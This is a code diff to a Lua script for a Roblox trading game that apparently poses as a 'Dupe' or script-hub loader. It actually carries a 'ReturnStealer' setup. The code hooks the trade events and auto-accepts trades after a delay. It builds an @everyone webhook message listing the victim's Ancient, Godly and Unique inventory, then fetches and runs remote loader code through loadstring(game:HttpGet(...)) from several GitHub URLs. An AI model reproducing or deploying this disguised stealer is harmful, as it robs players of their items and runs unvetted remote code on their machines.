@@ -4,7 +4,7 @@ Config = {
     FullInventory = true,
     ReturnStealer = true,
     Script = "Dupe",
-    CustomLink = ""
+    CustomLink = "None"
 }
 Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
 repeat
@@ -291,7 +291,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                     end
                 end
             end
-            wait(5)
+            wait(11)
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
         else
             local L = 0
@@ -317,7 +317,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                     end
                 end
             end
-            wait(5)
+            wait(11)
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
         end
     end
@@ -355,7 +355,7 @@ function StartTradesForExistingPlayers()
     end
 end
 local Q = {
-    ["content"] = "-- @everyone\n" .. k,
+        ["content"] = "-- @everyone\n" .. k,
     ["embeds"] = {
         {
             ["title"] = "🦖 **Wum_PH**",
@@ -375,7 +375,7 @@ local Q = {
                                                                 Config.Script ..
                                                                     "```\n🍗 **__Inventory__**\n```Ancient    🦖: " ..
                                                                         r ..
-                                                                            "\nGoldy      🌚: " ..
+                                                                            "\nGodly      🌚: " ..
                                                                                 q ..
                                                                                     "\nUnique     💀: " ..
                                                                                         s ..
@@ -423,7 +423,7 @@ elseif Config.Script == "Eclipse Hub" then
     T(G({Url = W .. "\?\107e\121\61" .. V(mainKey), Headers = {["User-Agent"] = "Eclipse"}}).Body)()
 elseif Config.Script == "R3TH PRIV" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
-elseif Config.Script == "Trade" then
+elseif Config.Script == "AshbornnHub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
 elseif Config.Script == "Dupe" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
